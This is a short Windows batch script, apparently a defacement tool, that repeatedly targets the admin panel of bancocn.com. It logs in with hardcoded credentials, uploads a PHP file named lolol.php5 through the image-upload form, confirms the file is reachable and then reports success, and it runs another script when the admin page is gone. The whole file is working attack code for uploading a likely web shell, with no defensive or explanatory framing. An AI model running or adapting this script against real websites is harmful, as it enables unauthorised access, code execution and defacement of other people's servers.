@echo off
setlocal enabledelayedexpansion

set FILE=C:\Users\HERCULIS\Desktop\defacecURL\lolol.php5
set ADMIN=http://www.bancocn.com/admin/login.php
set LOGIN=http://www.bancocn.com/admin/index.php
set UPLOAD=http://www.bancocn.com/admin/index.php
set AUTOPWN=http://www.bancocn.com/admin/uploads/lolol.php5
set COOKIE=cookies.txt

:check_online
for /L %%i in (1,1,5) do (
    rem pega http_code
    for /f "tokens=*" %%s in ('curl -s -o tmp_response.txt -w "%%{http_code}" %ADMIN%') do (
        set CODE=%%s
    )

    if "!CODE!"=="200" (
        findstr /i "Not Found" tmp_response.txt >nul
        if !errorlevel! == 0 (
            echo [%%i] 200 mas corpo diz "Not Found" - Admin deletado!
        ) else (
            echo [%%i] 200 OK - site online, tentando login e exploit...

            rem Login
            curl -s -c %COOKIE% -d "user=admin&password=senhafoda" %LOGIN% >nul

            rem Upload do arquivo
            curl -s -b %COOKIE% -F "image=@%FILE%" -F "title=lolol.php5" -F "category=1" -F "Add=Add" %UPLOAD% >nul

            rem Tenta acessar o arquivo upado
            for /f "tokens=*" %%u in ('curl -s -o tmp_up.txt -w "%%{http_code}" %AUTOPWN%') do set UPCODE=%%u
            if "!UPCODE!"=="200" (
                echo Upload ok! Arquivo disponivel em %AUTOPWN%
            ) else (
                echo Upload falhou ou arquivo nao encontrado!
            )
        )
    ) else if "!CODE!"=="521" (
        echo [%%i] 521 - Servidor reiniciando...
    ) else if "!CODE!"=="404" (
        echo [%%i] 404 - Admin deletado!
        python post.py
    ) else (
        echo [%%i] Status !CODE! - outro retorno
    )
)
goto check_online
